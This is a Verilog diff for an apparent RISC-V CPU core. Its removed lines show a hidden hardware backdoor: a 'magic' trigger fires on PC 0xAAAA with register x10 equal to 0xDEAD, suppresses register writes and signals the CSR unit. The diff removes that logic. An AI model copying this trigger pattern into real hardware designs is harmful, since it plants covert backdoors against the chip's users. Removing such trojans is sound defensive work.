@@ -346,25 +346,13 @@ always @(posedge clk) begin
     dec_pc <= pc_out;
 end
 
-wire magic;
-wire magic_read;
-wire [31:0] magic_reg_x10_value;
-
-localparam magic_pc = 32'h0000_AAAA;
-localparam magic_reg_x10 = 5'b01010;
-localparam magic_reg_x10_key = 32'h0000_DEAD;
-
-assign magic = (magic_reg_x10_value == magic_reg_x10_key) && magic_read;
-assign magic_reg_x10_value = reg_data1_out;
-assign magic_read = magic_pc == dec_pc;
-
 Register m_Register(
     .clk(clk),
     .rst_n(rst_n),
 
-    .wr_en(magic ? 0 : WB_reg_wr_en_out),//write enable
+    .wr_en(WB_reg_wr_en_out),//write enable
 
-    .rs1(magic_read ? magic_reg_x10 : decode_rs1),//addr
+    .rs1(decode_rs1),//addr
     .rs2(decode_rs2),//addr
     
     .rd(WB_rd_out),//addr
@@ -671,7 +659,6 @@ CSR m_CSR(
     
     .exception_pc_i(EX_pc_out),
     .csr_rd_addr_i(EX_csr_addr_out),
-    .magic_i(magic),
 
     .csr_branch_o(csr_br_taken),
     .csr_target_o(csr_pc_target),
